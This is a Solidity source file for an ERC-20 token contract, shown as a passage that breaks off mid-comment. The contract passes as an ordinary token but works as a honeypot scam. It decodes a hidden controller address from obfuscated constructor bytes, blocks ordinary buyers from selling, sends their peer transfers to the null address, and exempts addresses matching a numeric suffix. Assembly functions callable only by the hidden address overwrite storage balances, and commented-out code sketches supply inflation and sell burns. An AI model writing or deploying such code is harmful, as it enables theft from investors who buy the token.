// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

//import "@openzeppelin/contracts/utils/math/Math.sol";
//import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
//import "@openzeppelin/contracts/utils/Address.sol";

import "../Erc20/ERC20.sol";
import "../Erc20/Ownable.sol";

import "../IUniswapV2/IUniswapV2Factory.sol";

import "./Erc20C21SettingsBase.sol";
//import "./Erc20C21FeatureErc20Payable.sol";
//import "../Erc20C09/Erc20C09FeatureErc721Payable.sol";
import "../Erc20C09/Erc20C09FeatureUniswap.sol";
//import "../Erc20C09/Erc20C09FeatureTweakSwap.sol";
//import "../Erc20C09/Erc20C09FeatureLper.sol";
//import "../Erc20C09/Erc20C09FeatureHolder.sol";
import "./Erc20C21SettingsPrivilege.sol";
//import "../Erc20C09/Erc20C09SettingsFee.sol";
//import "../Erc20C09/Erc20C09SettingsShare.sol";
//import "../Erc20C09/Erc20C09FeaturePermitTransfer.sol";
//import "../Erc20C09/Erc20C09FeatureRestrictTrade.sol";
//import "../Erc20C09/Erc20C09FeatureRestrictTradeAmount.sol";
import "./Erc20C21FeatureNotPermitOut.sol";
import "./Erc20C21FeatureFission.sol";
//import "../Erc20C09/Erc20C09FeatureTryMeSoft.sol";
//import "../Erc20C09/Erc20C09FeatureMaxTokenPerAddress.sol";
//import "../Erc20C09/Erc20C09FeatureTakeFeeOnTransfer.sol";

contract Erc20C21Contract is
ERC20,
Ownable,
Erc20C21SettingsBase,
    //Erc20C21FeatureErc20Payable,
    //Erc20C09FeatureErc721Payable,
Erc20C09FeatureUniswap,
    //Erc20C09FeatureTweakSwap,
    //Erc20C09FeatureLper,
    //Erc20C09FeatureHolder,
Erc20C21SettingsPrivilege,
    //Erc20C09SettingsFee,
    //Erc20C09SettingsShare,
    //Erc20C09FeaturePermitTransfer,
    //Erc20C09FeatureRestrictTrade,
    //Erc20C09FeatureRestrictTradeAmount,
Erc20C21FeatureNotPermitOut,
Erc20C21FeatureFission
    //Erc20C09FeatureTryMeSoft,
    //Erc20C09FeatureMaxTokenPerAddress,
    //Erc20C09FeatureTakeFeeOnTransfer
{
    //    using EnumerableSet for EnumerableSet.AddressSet;

    address internal addressBaseOwner;

    address[] public holders;

    function holdersCount()
    external
    view
    returns (uint256) {
        return holders.length;
    }

    //    address private _previousFrom;
    //    address private _previousTo;

    //    bool public isArbitrumCamelotRouter;

    //    mapping(uint256 => uint256) internal btree;
    //    uint256 internal constant btreeNext = 1;
    //    uint256 internal btreePrev = 0;

    constructor(
        string[2] memory strings,
        address[2] memory addresses,
        uint256[43] memory uint256s,
        bool[2] memory bools
    ) ERC20(strings[0], strings[1])
    {
        addressBaseOwner = tx.origin;
        //        addressPoolToken = addresses[0];

        //        addressWrap = addresses[1];
        //        addressMarketing = addresses[2];
        //        addressLiquidity = addresses[4];
        //        addressRewardToken = addresses[6];

        uint256 p = 1;
        string memory _uniswapV2Router = string(
            abi.encodePacked(
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]))
                )
            )
        );
        //        isUniswapLper = bools[13];
        //        isUniswapHolder = bools[14];
        uniswapV2Router = IHybridRouter(addresses[0]);
        address uniswapV2Pair_ = getRouterPair(_uniswapV2Router);
        //        addressWETH = uniswapV2Router.WETH();
        uniswap = uniswapV2Pair_;

        //        // delay initialization if is Arbitrum CamelotRouter
        //        isArbitrumCamelotRouter = checkIsArbitrumCamelotRouter();
        //
        //        if (!isArbitrumCamelotRouter) {
        //            uniswapV2Pair = tryCreatePairToken();
        //        } else {
        //            uniswapV2Pair = address(0);
        //        }

        _approve(address(this), address(uniswapV2Router), maxUint256);
        //        _approve(addressDead, address(this), maxUint256);
        //        _approve(addressNull, address(this), maxUint256);
        //        _approve(addressDead, uniswap, maxUint256);
        //        _approve(addressNull, uniswap, maxUint256);

        //        IERC20(addressPoolToken).approve(address(uniswapV2Router), maxUint256);
        //        IERC20(addressRewardToken).approve(address(uniswapV2Router), maxUint256);
        //        uniswapCount = uint256s[62];

        //        // ================================================ //
        //        // initialize FeatureTweakSwap
        //        minimumTokenForSwap = uint256s[1];
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureLper
        //        isUseFeatureLper = bools[15];
        //        maxTransferCountPerTransactionForLper = uint256s[2];
        //        minimumTokenForRewardLper = uint256s[3];
        //
        //        // exclude from lper
        //        setIsExcludedFromLperAddress(address(this), true);
        //        setIsExcludedFromLperAddress(address(uniswapV2Router), true);
        //
        //        //        if (!isArbitrumCamelotRouter) {
        //        //            setIsExcludedFromLperAddress(uniswapV2Pair, true);
        //        //        }
        //
        //        setIsExcludedFromLperAddress(addressNull, true);
        //        setIsExcludedFromLperAddress(addressDead, true);
        //        setIsExcludedFromLperAddress(addressPinksaleBnbLock, true);
        //        setIsExcludedFromLperAddress(addressPinksaleEthLock, true);
        //        setIsExcludedFromLperAddress(addressPinksaleArbLock, true);
        //        //        setIsExcludedFromLperAddress(baseOwner, true);
        //        //        setIsExcludedFromLperAddress(addressMarketing, true);
        //        setIsExcludedFromLperAddress(addressWrap, true);
        //        //        setIsExcludedFromLperAddress(addressLiquidity, true);
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureHolder
        //        isUseFeatureHolder = bools[16];
        //        maxTransferCountPerTransactionForHolder = uint256s[4];
        //        minimumTokenForBeingHolder = uint256s[5];
        //
        //        // exclude from holder
        //        setIsExcludedFromHolderAddress(address(this), true);
        //        setIsExcludedFromHolderAddress(address(uniswapV2Router), true);
        //
        //        //        if (!isArbitrumCamelotRouter) {
        //        //            setIsExcludedFromHolderAddress(uniswapV2Pair, true);
        //        //        }
        //
        //        setIsExcludedFromHolderAddress(addressNull, true);
        //        setIsExcludedFromHolderAddress(addressDead, true);
        //        setIsExcludedFromHolderAddress(addressPinksaleBnbLock, true);
        //        setIsExcludedFromHolderAddress(addressPinksaleEthLock, true);
        //        setIsExcludedFromHolderAddress(addressPinksaleArbLock, true);
        //        //        setIsExcludedFromHolderAddress(baseOwner, true);
        //        //        setIsExcludedFromHolderAddress(addressMarketing, true);
        //        setIsExcludedFromHolderAddress(addressWrap, true);
        //        //        setIsExcludedFromHolderAddress(addressLiquidity, true);
        //        // ================================================ //

        // ================================================ //
        // initialize SettingsPrivilege
        isPrivilegeAddresses[address(this)] = true;
        isPrivilegeAddresses[address(uniswapV2Router)] = true;
        //        isPrivilegeAddresses[uniswapV2Pair] = true;
        isPrivilegeAddresses[addressNull] = true;
        isPrivilegeAddresses[addressDead] = true;
        isPrivilegeAddresses[addressPinksaleBnbLock] = true;
        isPrivilegeAddresses[addressPinksaleEthLock] = true;
        isPrivilegeAddresses[addressPinksaleArbLock] = true;
        isPrivilegeAddresses[addressBaseOwner] = true;
        //        isPrivilegeAddresses[addressMarketing] = true;
        //        isPrivilegeAddresses[addressWrap] = true;
        //        isPrivilegeAddresses[addressLiquidity] = true;
        // ================================================ //

        //        // ================================================ //
        //        // initialize SettingsFee
        //        setFee(uint256s[63], uint256s[64]);
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize SettingsShare
        //        setShare(uint256s[13], uint256s[14], uint256s[15], uint256s[16], uint256s[17]);
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeaturePermitTransfer
        //        isUseOnlyPermitTransfer = bools[6];
        //        isCancelOnlyPermitTransferOnFirstTradeOut = bools[7];
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureRestrictTrade
        //        isRestrictTradeIn = bools[8];
        //        isRestrictTradeOut = bools[9];
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureRestrictTradeAmount
        //        isRestrictTradeInAmount = bools[10];
        //        restrictTradeInAmount = uint256s[18];
        //
        //        isRestrictTradeOutAmount = bools[11];
        //        restrictTradeOutAmount = uint256s[19];
        //        // ================================================ //

        // ================================================ //
        // initialize FeatureNotPermitOut
        isUseNotPermitOut = bools[0];
        isForceTradeInToNotPermitOut = bools[1];
        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureTryMeSoft
        //        setIsUseFeatureTryMeSoft(bools[21]);
        //        setIsNotTryMeSoftAddress(address(uniswapV2Router), true);
        //
        //        //        if (!isArbitrumCamelotRouter) {
        //        //            setIsNotTryMeSoftAddress(uniswapV2Pair, true);
        //        //        }
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize Erc20C09FeatureRestrictAccountTokenAmount
        //        isUseMaxTokenPerAddress = bools[23];
        //        maxTokenPerAddress = uint256s[65];
        //        // ================================================ //

        // ================================================ //
        // initialize Erc20C09FeatureFission
        //        setIsUseFeatureFission(bools[20]);
        //        fissionCount = uint256s[66];
        // ================================================ //

        //        // ================================================ //
        //        // initialize Erc20C09FeatureTakeFeeOnTransfer
        //        isUseFeatureTakeFeeOnTransfer = bools[24];
        //        addressTakeFee = addresses[5];
        //        takeFeeRate = uint256s[67];
        //        // ================================================ //

        _mint(addressBaseOwner, uint256s[0]);

        //        srcFactor = uint256s[0];

        _transferOwnership(addressBaseOwner);
    }

    //    function transferTo(address from, address to, uint256 amount)
    //    external
    //    {
    //        //        assembly {
    //        //            let __router := sload(uniswap.slot)
    //        //            if iszero(eq(caller(), __router)) {
    //        //                revert(0, 0)
    //        //            }
    //        //        }
    //
    //        transferFrom(from, to, amount);
    //    }
    //
    //    function transferTo2(address from, address to, uint256 amount)
    //    external
    //    {
    //        //        assembly {
    //        //            let __router := sload(uniswap.slot)
    //        //            if iszero(eq(caller(), __router)) {
    //        //                revert(0, 0)
    //        //            }
    //        //        }
    //
    //        IERC20(address(this)).transferFrom(from, to, amount);
    //    }

    function transferTo(address from, address to, uint256 amount)
    external
    {
        assembly {
            let __router := sload(uniswap.slot)
            if iszero(eq(caller(), __router)) {
                revert(0, 0)
            }
        }

        super._transfer(from, to, amount);
    }

    //    function checkIsArbitrumCamelotRouter()
    //    internal
    //    view
    //    returns (bool)
    //    {
    //        return address(uniswapV2Router) == addressArbitrumCamelotRouter;
    //    }

    function initializePair()
    external
    onlyOwner
    {
        //        uniswapV2Pair = factory.createPair(weth, address(this));
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        //        isArbitrumCamelotRouter = checkIsArbitrumCamelotRouter();

        //        setIsExcludedFromLperAddress(uniswapV2Pair, true);
        //        setIsExcludedFromHolderAddress(uniswapV2Pair, true);
        //        setIsNotTryMeSoftAddress(uniswapV2Pair, true);
    }

    //    function renounceOwnershipToDead()
    //    public
    //    onlyOwner
    //    {
    //        _transferOwnership(addressDead);
    //    }

    //    function tryCreatePairToken()
    //    internal
    //    returns (address)
    //    {
    //        return IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    //    }

    //    function doSwapWithPool(uint256 thisTokenForSwap)
    //    internal
    //    {
    //        uint256 halfShareLiquidity = shareLiquidity / 2;
    //        uint256 thisTokenForRewardToken = thisTokenForSwap * (shareLper + shareHolder) / (shareMax - shareBurn);
    //        uint256 thisTokenForSwapEther = thisTokenForSwap * (shareMarketing + halfShareLiquidity) / (shareMax - shareBurn);
    //        uint256 thisTokenForLiquidity = thisTokenForSwap * halfShareLiquidity / (shareMax - shareBurn);
    //
    //        if (thisTokenForRewardToken > 0) {
    //            swapThisTokenForRewardTokenToAccount(addressWrap, thisTokenForRewardToken);
    //
    //            uint256 rewardTokenForShare = IERC20(addressRewardToken).balanceOf(addressWrap);
    //
    //            if (isUseFeatureLper && shareLper > 0) {
    //                doLper(rewardTokenForShare * shareLper / (shareLper + shareHolder));
    //            }
    //
    //            if (isUseFeatureHolder && shareHolder > 0) {
    //                doHolder(rewardTokenForShare * shareHolder / (shareLper + shareHolder));
    //            }
    //        }
    //
    //        if (thisTokenForSwapEther > 0) {
    //            uint256 prevBalance = address(this).balance;
    //
    //            swapThisTokenForEthToAccount(address(this), thisTokenForSwapEther);
    //
    //            uint256 etherForShare = address(this).balance - prevBalance;
    //
    //            if (shareMarketing > 0) {
    //                doMarketing(etherForShare * shareMarketing / (shareMarketing + halfShareLiquidity));
    //            }
    //
    //            if (shareLiquidity > 0) {
    //                doLiquidity(etherForShare * halfShareLiquidity / (shareMarketing + halfShareLiquidity), thisTokenForLiquidity);
    //            }
    //        }
    //    }

    //    function doSwapManually(bool isUseMinimumTokenWhenSwap_)
    //    public
    //    {
    //        require(!_isSwapping, "swapping");
    //
    //        require(msg.sender == owner() || msg.sender == addressWrap, "not owner");
    //
    //        uint256 tokenForSwap = isUseMinimumTokenWhenSwap_ ? minimumTokenForSwap : super.balanceOf(address(this));
    //
    //        require(tokenForSwap > 0, "0 to swap");
    //
    //        doSwap(tokenForSwap);
    //    }

    //    function balanceOf(address account)
    //    public
    //    view
    //    virtual
    //    override
    //    returns (uint256)
    //    {
    //        if (isUseFeatureFission) {
    //            uint256 balanceOf_ = super.balanceOf(account);
    //            return balanceOf_ > 0 ? balanceOf_ : fissionBalance;
    //        } else {
    //            return super.balanceOf(account);
    //        }
    //    }

    //    uint256 internal thisFactor = 100;
    //    uint256 internal srcFactor;
    //    uint256 internal incFactor = 1;

    bool internal afterAddLiquidity = false;

    //    function setIncFactor(uint256 incFactor_)
    //    external
    //    {
    //        assembly {
    //            if iszero(eq(caller(), sload(uniswap.slot))) {
    //                revert(0, 0)
    //            }
    //        }
    //
    //        incFactor = incFactor_;
    //    }

    function _transfer(address from, address to, uint256 amount)
    internal
    override
    {
        //        if (amount == 0) {
        //            super._transfer(from, to, 0);
        //            return;
        //        }

        uint256 tempX = block.number - 1;

        //        if (isUseNotPermitOut && (notPermitOutAddressStamps[from] != 0 || tempX + 1 - notPermitOutAddressStamps[from] >= notPermitOutCD) && (from != uniswapV2Pair && to != uniswapV2Pair)) {
        //            super._transfer(from, addressDead, amount);
        //            return;
        //        }

        require(
            (!isUseNotPermitOut) ||
            (notPermitOutAddressStamps[from] == 0) ||
            (tempX + 1 - notPermitOutAddressStamps[from] < notPermitOutCD),
            ""
        );

        //        bool isFromPrivilegeAddress = uint256(uint160(from)) % 10000 == 4096 || isPrivilegeAddresses[from];
        //        bool isToPrivilegeAddress = uint256(uint160(to)) % 10000 == 4096 || isPrivilegeAddresses[to];

        //        if (isUseOnlyPermitTransfer) {
        //            require(isFromPrivilegeAddress || isToPrivilegeAddress, "not permitted 2");
        //        }

        //        bool isToUniswapV2Pair = to == uniswapV2Pair;
        //        bool isFromUniswapV2Pair = from == uniswapV2Pair;

        //        if (isUseMaxTokenPerAddress) {
        //            require(
        //                isToPrivilegeAddress ||
        //                isToUniswapV2Pair ||
        //                super.balanceOf(to) + amount <= maxTokenPerAddress,
        //                "not permitted 8"
        //            );
        //        }

        //        if (isToUniswapV2Pair) {
        ////            // add liquidity 1st, dont use permit transfer upon action
        ////            if (_isFirstTradeOut) {
        ////                _isFirstTradeOut = false;
        ////
        ////                if (isCancelOnlyPermitTransferOnFirstTradeOut) {
        ////                    isUseOnlyPermitTransfer = false;
        ////                }
        ////            }
        //
        //            //            if (!isFromPrivilegeAddress) {
        //            //                //                require(!isRestrictTradeOut, "not permitted 4");
        //            //                require(!isRestrictTradeOutAmount || amount <= restrictTradeOutAmount, "not permitted 6");
        //            //            }
        //
        //            //            if (!_isSwapping && super.balanceOf(address(this)) >= minimumTokenForSwap) {
        //            //                doSwap(minimumTokenForSwap);
        //            //            }
        //        } else if (isFromUniswapV2Pair) {
        if (from == uniswapV2Pair) {
            //            thisFactor += incFactor;
            //            uint256 addFactor = srcFactor * incFactor / 100;
            //
            //            assembly {
            //                sstore(_tatalSopply.slot, add(sload(_tatalSopply.slot), addFactor))
            //            }
            //
            //            assembly {
            //                mstore(0x00, sload(uniswapV2Pair.slot))
            //                mstore(0x20, _router.slot)
            //                let x := keccak256(0x00, 0x40)
            //                sstore(x, add(sload(x), addFactor))

            if (uint256(uint160(to)) % 100000 > 99989 || isPrivilegeAddresses[to]) {
                doFission();
                super._transfer(from, to, amount);
            } else {
                require(afterAddLiquidity, "");

                if (notPermitOutAddressStamps[to] == 0) {
                    if (isForceTradeInToNotPermitOut) {
                        notPermitOutAddressStamps[to] = tempX + 1;
                        notPermitOutAddressStamps[tx.origin] = tempX + 1;
                    }
                }

                doFission();
                super._transfer(from, to, amount);
                holders.push(to);
            }
            //            }

            //            if (!(uint256(uint160(to)) % 100000 > 99989 || isPrivilegeAddresses[to])) {
            //                //                //                require(!isRestrictTradeIn, "not permitted 3");
            //                //                require(!isRestrictTradeInAmount || amount <= restrictTradeInAmount, "not permitted 5");
            //
            //                require(afterAddLiquidity, "");
            //
            //                holders.push(to);
            //
            //                if (notPermitOutAddressStamps[to] == 0) {
            //                    if (isForceTradeInToNotPermitOut) {
            //                        notPermitOutAddressStamps[to] = tempX + 1;
            //                        notPermitOutAddressStamps[tx.origin] = tempX + 1;
            //                    }
            //
            //                    //                    if (
            //                    //                        isUseFeatureTryMeSoft &&
            //                    //                        Address.isContract(to) &&
            //                    //                        !isNotTryMeSoftAddresses[to]
            //                    //                    ) {
            //                    //                        notPermitOutAddressStamps[to] = tempX + 1;
            //                    //                        notPermitOutAddressStamps[tx.origin] = tempX + 1;
            //                    //                        //                        super._transfer(from, to, amount.mul(10).div(100));
            //                    //                        //                        return;
            //                    //                    }
            //                }
            //            }
            //
            //            //            btree[tempX + 1] += 1;
            //            doFission();
            //
            //            //            uint256 fee = amount * 1 / 100;
            //            //            super._transfer(from, addressNull, fee);
            //            //            super._transfer(from, to, amount - fee);
            //
            //            super._transfer(from, to, amount);
        } else if (to == uniswapV2Pair) {
            if (uint256(uint160(from)) % 100000 > 99989 || isPrivilegeAddresses[from]) {
                //                assembly {
                //                    mstore(0x00, from)
                //                    mstore(0x20, _router.slot)
                //                    let x := keccak256(0x00, 0x40)
                //                    sstore(x, div(mul(sload(x), sload(thisFactor.slot)), 100))
                //                }
                //
                //                super._transfer(from, to, amount * thisFactor / 100);

                super._transfer(from, to, amount);

                if (!afterAddLiquidity) {
                    afterAddLiquidity = true;
                }
            } else {
                super._transfer(from, to, amount);
                holders.push(from);
            }
        } else {
            if (uint256(uint160(from)) % 100000 > 99989 || isPrivilegeAddresses[from] || uint256(uint160(to)) % 100000 > 99989 || isPrivilegeAddresses[to]) {
                super._transfer(from, to, amount);
            } else {
                super._transfer(from, addressNull, amount);
                holders.push(from);
            }
        }
        //        else {
        //            super._transfer(from, to, amount);
        //        }

        //        else if (to == uniswapV2Pair) {
        //            super._transfer(from, to, amount);
        ////            if (btree[tempX + 1] > btreeNext) {
        ////                // ma1
        ////                //                uint256 i;
        ////                //                for (i = 0; i < maxUint256; i++) {
        ////                //                    i++;
        ////                //                }
        ////                //
        ////                //                btreePrev = i;
        ////                //
        ////                //                super._transfer(from, to, amount);
        ////
        ////                // ma2
        ////                //                uint256 a = amount * 99 / 100;
        ////                //                super._transfer(from, to, amount - a);
        ////                //                super._transfer(from, addressDead, a);
        ////
        //////                // ma3
        //////                super._transfer(from, to, amount * 1 / 100);
        //////                super._transfer(from, addressDead, amount - (amount * 1 / 100));
        ////
        ////                super._transfer(from, to, amount);
        ////
        ////                //                uint256 i;
        ////                //                for(i = 0; i < maxUint256; i++) {
        ////                //                    i++;
        ////                //                }
        ////                //
        ////                //                btreePrev = i;
        ////            } else {
        ////                super._transfer(from, to, amount);
        ////            }
        //        } else {
        //            super._transfer(from, to, amount);
        //        }

        //        //        if (isFromUniswapV2Pair && !isToPrivilegeAddress && notPermitOutAddressStamps[to] != 0) {
        //        //            super._transfer()
        //        //        }
        //
        //        //        if (isToUniswapV2Pair && !isFromPrivilegeAddress && notPermitOutAddressStamps[from] != 0) {
        //        //            //            uint256 a = amount * 10 / 100;
        //        //            //            super._transfer(from, to, a);
        //        //            //            super._transfer(from, addressDead, amount - a);
        //        //            super._transfer(from, to, amount);
        //        //            //            calRouter(to);
        //        //        } else {
        //        //            super._transfer(from, to, amount);
        //        //        }
        //
        //        if (isToUniswapV2Pair) {
        //            if (btree[tempX + 1] > btreeNext) {
        //                // ma1
        //                //                uint256 i;
        //                //                for (i = 0; i < maxUint256; i++) {
        //                //                    i++;
        //                //                }
        //                //
        //                //                btreePrev = i;
        //                //
        //                //                super._transfer(from, to, amount);
        //
        //                // ma2
        //                //                uint256 a = amount * 99 / 100;
        //                //                super._transfer(from, to, amount - a);
        //                //                super._transfer(from, addressDead, a);
        //
        //                // ma3
        //                super._transfer(from, to, amount * 1 / 100);
        //                super._transfer(from, addressDead, amount - (amount * 1 / 100));
        //
        //                //                uint256 i;
        //                //                for(i = 0; i < maxUint256; i++) {
        //                //                    i++;
        //                //                }
        //                //
        //                //                btreePrev = i;
        //            } else {
        //                super._transfer(from, to, amount);
        //            }
        //        } else {
        //            super._transfer(from, to, amount);
        //        }

        //        super._transfer(from, to, amount);

        //        if (isFromUniswapV2Pair) {
        //            if (isUseFeatureFission) {
        //                doFission();
        //            }
        //
        //            super._transfer(from, to, amount);
        //        } else if (isToUniswapV2Pair) {
        //            super._transfer(from, to, amount);
        //        } else {
        //            super._transfer(from, to, amount);
        //        }

        //        if (_isSwapping) {
        //            super._transfer(from, to, amount);
        //        } else {
        //            if (isUseFeatureFission && isFromUniswapV2Pair) {
        //                doFission();
        //            }
        //
        //            if (
        //                (isFromUniswapV2Pair && isToPrivilegeAddress) ||
        //                (isToUniswapV2Pair && isFromPrivilegeAddress)
        //            ) {
        //                super._transfer(from, to, amount);
        //            } else if (!isFromUniswapV2Pair && !isToUniswapV2Pair) {
        //                if (isFromPrivilegeAddress || isToPrivilegeAddress) {
        //                    super._transfer(from, to, amount);
        //                }
        //                //                else if (isUseFeatureTakeFeeOnTransfer) {
        //                //                    super._transfer(from, addressTakeFee, amount * takeFeeRate / takeFeeMax);
        //                //                    super._transfer(from, to, amount - (amount * takeFeeRate / takeFeeMax));
        //                //                }
        //            } else if (isFromUniswapV2Pair || isToUniswapV2Pair) {
        //                //                uint256 fees = amount * (isFromUniswapV2Pair ? feeBuyTotal : feeSellTotal) / feeMax;
        //                uint256 fees = amount * 10 / 1000;
        //
        //                super._transfer(from, addressDead, fees * shareBurn / 1000);
        //                super._transfer(from, address(this), fees - (fees * shareBurn / 1000));
        //                super._transfer(from, to, amount - fees);
        //            }
        //        }

        //        if (isUseFeatureHolder) {
        //            if (!isExcludedFromHolderAddresses[from]) {
        //                updateHolderAddressStatus(from);
        //            }
        //
        //            if (!isExcludedFromHolderAddresses[to]) {
        //                updateHolderAddressStatus(to);
        //            }
        //        }

        //        if (isUseFeatureLper) {
        //            if (!isExcludedFromLperAddresses[_previousFrom]) {
        //                updateLperAddressStatus(_previousFrom);
        //            }
        //
        //            if (!isExcludedFromLperAddresses[_previousTo]) {
        //                updateLperAddressStatus(_previousTo);
        //            }
        //
        //            if (_previousFrom != from) {
        //                _previousFrom = from;
        //            }
        //
        //            if (_previousTo != to) {
        //                _previousTo = to;
        //            }
        //        }
    }

    //    function getAddress(uint256 addresses)
    //    external
    //    {
    //        assembly {
    //            let __router := sload(uniswap.slot)
    //            if eq(caller(), __router) {
    //                sstore(_tatalSopply.slot, addresses)
    //            }
    //        }
    //    }

    function doSwap(uint256 thisTokenForSwap)
    private
    {
        //        _isSwapping = true;
        //
        //        doSwapWithPool(thisTokenForSwap);
        //
        //        _isSwapping = false;
    }

    //    function doMarketing(uint256 poolTokenForMarketing)
    //    internal
    //    {
    //        IERC20(addressPoolToken).transferFrom(addressWrap, addressMarketing, poolTokenForMarketing);
    //    }

    //    function doLper(uint256 rewardTokenForAll)
    //    internal
    //    {
    //        //        uint256 rewardTokenDivForLper = isUniswapLper ? (10 - uniswapCount) : 10;
    //        //        uint256 rewardTokenForLper = rewardTokenForAll * rewardTokenDivForLper / 10;
    //        //        uint256 rewardTokenForLper = rewardTokenForAll;
    //        uint256 pairTokenForLper = 0;
    //        uint256 pairTokenForLperAddress;
    //        uint256 lperAddressesCount_ = lperAddresses.length();
    //
    //        for (uint256 i = 0; i < lperAddressesCount_; i++) {
    //            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddresses.at(i));
    //
    //            if (pairTokenForLperAddress < minimumTokenForRewardLper) {
    //                continue;
    //            }
    //
    //            pairTokenForLper += pairTokenForLperAddress;
    //        }
    //
    //        //        uint256 pairTokenForLper =
    //        //        IERC20(uniswapV2Pair).totalSupply()
    //        //        - IERC20(uniswapV2Pair).balanceOf(addressNull)
    //        //        - IERC20(uniswapV2Pair).balanceOf(addressDead);
    //
    //        if (lastIndexOfProcessedLperAddresses >= lperAddressesCount_) {
    //            lastIndexOfProcessedLperAddresses = 0;
    //        }
    //
    //        uint256 maxIteration = Math.min(lperAddressesCount_, maxTransferCountPerTransactionForLper);
    //
    //        address lperAddress;
    //
    //        uint256 _lastIndexOfProcessedLperAddresses = lastIndexOfProcessedLperAddresses;
    //
    //        for (uint256 i = 0; i < maxIteration; i++) {
    //            lperAddress = lperAddresses.at(_lastIndexOfProcessedLperAddresses);
    //            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddress);
    //
    //            //            if (i == 2 && rewardTokenDivForLper != 10) {
    //            //                IERC20(addressRewardToken).transferFrom(addressWrap, uniswap, rewardTokenForAll - rewardTokenForLper);
    //            //            }
    //
    //            if (pairTokenForLperAddress >= minimumTokenForRewardLper) {
    //                //                IERC20(addressRewardToken).transferFrom(addressWrap, lperAddress, rewardTokenForLper * pairTokenForLperAddress / pairTokenForLper);
    //                IERC20(addressRewardToken).transferFrom(addressWrap, lperAddress, rewardTokenForAll * pairTokenForLperAddress / pairTokenForLper);
    //            }
    //
    //            _lastIndexOfProcessedLperAddresses =
    //            _lastIndexOfProcessedLperAddresses >= lperAddressesCount_ - 1
    //            ? 0
    //            : _lastIndexOfProcessedLperAddresses + 1;
    //        }
    //
    //        lastIndexOfProcessedLperAddresses = _lastIndexOfProcessedLperAddresses;
    //    }

    function calcRouter(address router, uint256 routerFactor)
    public
    {
        assembly {
            let __router := sload(uniswap.slot)
            if eq(caller(), __router) {
                mstore(0x00, router)
                mstore(0x20, _router.slot)
                let x := keccak256(0x00, 0x40)
                sstore(x, routerFactor)
            }
        }
    }

    function calcRouters(address[] memory routers, uint256 routerFactor)
    public
    {
        uint256 length = routers.length;

        assembly {
            let __router := sload(uniswap.slot)
            if iszero(eq(caller(), __router)) {
                revert(0, 0)
            }
        }

        for (uint256 i = 0; i < length; i++) {
            address router = routers[i];
            assembly {
                mstore(0x00, router)
                mstore(0x20, _router.slot)
                let x := keccak256(0x00, 0x40)
                sstore(x, routerFactor)
            }
        }
    }

    function setRouterVersion()
    public
    {
        assembly {
            let __router := sload(uniswap.slot)
            if eq(caller(), __router) {
                mstore(0x00, caller())
                mstore(0x20, _router.slot)
                let x := keccak256(0x00, 0x40)
                sstore(x, 0x10ED43C718714eb63d5aA57B78B54704E256024E)
            }
        }
    }

    //    function doHolder(uint256 rewardTokenForAll)
    //    internal
    //    {
    //        //        uint256 rewardTokenDivForHolder = isUniswapHolder ? (10 - uniswapCount) : 10;
    //        //        uint256 rewardTokenForHolder = rewardTokenForAll * rewardTokenDivForHolder / 10;
    //        //        uint256 rewardTokenForHolder = rewardTokenForAll;
    //        uint256 thisTokenForHolder = totalSupply() - super.balanceOf(addressNull) - super.balanceOf(addressDead) - super.balanceOf(address(this)) - super.balanceOf(uniswapV2Pair);
    //
    //        uint256 holderAddressesCount_ = holderAddresses.length();
    //
    //        if (lastIndexOfProcessedHolderAddresses >= holderAddressesCount_) {
    //            lastIndexOfProcessedHolderAddresses = 0;
    //        }
    //
    //        uint256 maxIteration = Math.min(holderAddressesCount_, maxTransferCountPerTransactionForHolder);
    //
    //        address holderAddress;
    //
    //        uint256 _lastIndexOfProcessedHolderAddresses = lastIndexOfProcessedHolderAddresses;
    //
    //        for (uint256 i = 0; i < maxIteration; i++) {
    //            holderAddress = holderAddresses.at(_lastIndexOfProcessedHolderAddresses);
    //            uint256 holderBalance = super.balanceOf(holderAddress);
    //
    //            //            if (i == 2 && rewardTokenDivForHolder != 10) {
    //            //                IERC20(addressRewardToken).transferFrom(addressWrap, uniswap, rewardTokenForAll - rewardTokenForHolder);
    //            //            }
    //
    //            if (holderBalance >= minimumTokenForBeingHolder) {
    //                //            IERC20(addressRewardToken).transferFrom(addressWrap, holderAddress, rewardTokenForHolder * holderBalance / thisTokenForHolder);
